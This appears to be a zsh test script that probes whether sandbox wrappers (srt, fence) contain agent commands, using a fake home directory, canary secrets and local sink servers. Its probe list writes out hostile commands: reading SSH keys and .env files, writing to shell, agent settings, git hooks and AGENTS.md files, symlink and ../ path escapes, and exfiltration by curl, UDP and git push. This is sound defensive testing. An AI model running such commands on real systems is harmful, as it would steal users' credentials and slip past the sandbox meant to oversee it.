#!/bin/zsh
# usage: probes.sh MODE(none|srt|fence) ; T0 only: fake HOME, canaries, 127.0.0.1 sinks.
MODE=$1; S3=${0:A:h}; RUN=$HOME/.af-s3/run-$MODE; rm -rf $RUN; mkdir -p $RUN
H=$RUN/home; P=$H/proj; mkdir -p $H/.ssh $H/.claude $P/.git/hooks "$H/Library/Mobile Documents/com~apple~CloudDocs"
C1=AFCANARY-$MODE-ssh-$RANDOM; C2=AFCANARY-$MODE-env-$RANDOM; C3=AFCANARY-$MODE-note-$RANDOM
echo $C1 > $H/.ssh/id_ed25519; echo "TOKEN=$C2" > $P/.env; echo $C3 > $P/notes.txt
HP=$((20000 + RANDOM % 5000)); UP=$((HP + 7)); LOG=$RUN/sink.log; : > $LOG
python3 $S3/sink.py $HP $UP $C1,$C2,$C3 $LOG & SPID=$!; sleep 0.5
SRT=$HOME/dev/agent-floor/tools/node_modules/.bin/srt
cat > $RUN/srt.json <<J
{"network":{"allowedDomains":["127.0.0.1:$HP"],"deniedDomains":[]},
 "filesystem":{"denyRead":["$H/.ssh","$P/.env"],"allowRead":[],"allowWrite":["$P","/private/tmp/af-s3-none"],
  "denyWrite":["$P/.git/hooks","$H/.claude/settings.json","$H/.zshrc"]}}
J
wrap() { case $MODE in
  none) env HOME=$H bash -c "$1";;
  srt) env HOME=$H $SRT --settings $RUN/srt.json -- bash -c "$1";;
  fence) env HOME=$H fence -t code -- bash -c "$1";; esac }
typeset -A CMD
CMD[ssh-read]="cat $H/.ssh/id_ed25519"
CMD[env-read]="cat $P/.env"
CMD[cfg-write]="echo x >> $H/.zshrc"
CMD[claude-settings-write]="echo '{}' > $H/.claude/settings.json"
CMD[git-hook-write]="echo x > $P/.git/hooks/pre-commit"
CMD[symlink-escape]="ln -sf $H/.ssh/id_ed25519 $P/lnk && cat $P/lnk"
CMD[dotdot-escape]="cat $P/../.ssh/id_ed25519"
CMD[icloud-write]="echo x > '$H/Library/Mobile Documents/com~apple~CloudDocs/af.txt'"
CMD[http-denied]="curl -s -m 5 -o /dev/null -w %{http_code} http://denied.invalid/$C3"
CMD[dns-exfil]="python3 -c \"import socket;socket.socket(2,2).sendto(b'$C3',('127.0.0.1',$UP))\""
CMD[git-push-sink]="cd $P && git push -q http://127.0.0.1:$((HP+1))/$C3.git HEAD >/dev/null 2>&1"
CMD[instruction-write]="echo x > $P/AGENTS.md"
CMD[allowed-host-exfil]="cat $P/.env >/dev/null 2>&1; curl --noproxy '' -s -m 5 -o /dev/null -w %{http_code} -d @$P/notes.txt http://127.0.0.1:$HP/up"
cd $P; git init -q 2>/dev/null; git -c user.email=a@b -c user.name=a commit -q --allow-empty -m x 2>/dev/null
for id in ssh-read env-read cfg-write claude-settings-write git-hook-write symlink-escape dotdot-escape icloud-write http-denied dns-exfil git-push-sink instruction-write allowed-host-exfil; do
  out=$(cd $P && perl -e 'alarm 30; exec @ARGV' zsh -c "$(typeset -f wrap); MODE=$MODE H=$H SRT=$SRT RUN=$RUN; wrap ${(q)CMD[$id]}" 2>&1); rc=$?
  ev="-"; [[ $out == *AFCANARY* ]] && ev=canary-in-stdout
  echo "$id rc=$rc ev=$ev" >> $RUN/rows.txt
done
sleep 0.5; kill $SPID 2>/dev/null
f() { [[ -e $1 ]] && echo written || echo absent; }
echo "files: zshrc=$(f $H/.zshrc) claude-settings=$(f $H/.claude/settings.json) hook=$(f $P/.git/hooks/pre-commit) icloud=$(f "$H/Library/Mobile Documents/com~apple~CloudDocs/af.txt") agents=$(f $P/AGENTS.md)" >> $RUN/rows.txt
sed 's/AFCANARY-[a-z]*-\([a-z]*\)-[0-9]*/canary:\1/' $LOG > $RUN/sink.redacted; rm $LOG
